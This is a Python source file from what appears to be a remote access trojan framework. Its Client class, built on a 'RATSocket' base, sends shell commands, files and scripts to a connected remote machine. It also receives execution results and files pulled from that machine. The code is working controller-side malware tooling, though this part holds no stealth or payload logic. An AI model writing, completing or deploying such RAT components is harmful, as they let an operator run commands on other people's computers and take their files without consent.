import json
import ntpath
import os

from common.ratsocket import RATSocket
from server.util import update_progress


class Client(RATSocket):

    def __init__(self, s, address=None, info=None):
        super().__init__()
        self.socket = s
        self.address = address
        self.info = info

    def send_command(self, command, type='command'):
        """ 发送命令 """
        body = command.encode()
        head = {
            'type': type,
            'length': len(body)
        }
        self.send(head, body=body)

    def send_file(self, filename, type='file', args: dict = None):
        """ 发送文件 """
        head = {
            'type': type,
            'filename': ntpath.basename(filename),
            'length': os.stat(filename).st_size
        }
        with open(filename, 'rb') as f:
            if type == 'file':
                self.send(head, f=f, update_progress=update_progress)
            elif type == 'script':
                if args is not None:
                    head['args'] = json.dumps(args)
                self.send(head, f=f)

    def recv_result(self) -> (int, str):
        """ 接收执行结果或文件 """
        # 接收消息头
        head = self.recv_head()
        # 消息类型
        type = head['type']
        # 接收执行结果
        if type == 'result':
            return head['status'], self.recv_body(head)
        # 接收文件
        elif type == 'file':
            try:
                # 文件名
                filename = head['filename']
                # 创建文件
                with open(filename, 'ab') as f:
                    # 清空文件内容
                    f.truncate(0)
                    # 接收文件内容
                    self.recv_body(head, f=f, update_progress=update_progress)
                # 返回文件路径
                return 1, '\nFile saved to: {}'.format(os.path.abspath(filename))
            except Exception as e:
                return 0, 'Error receiving file: {}'.format(e)
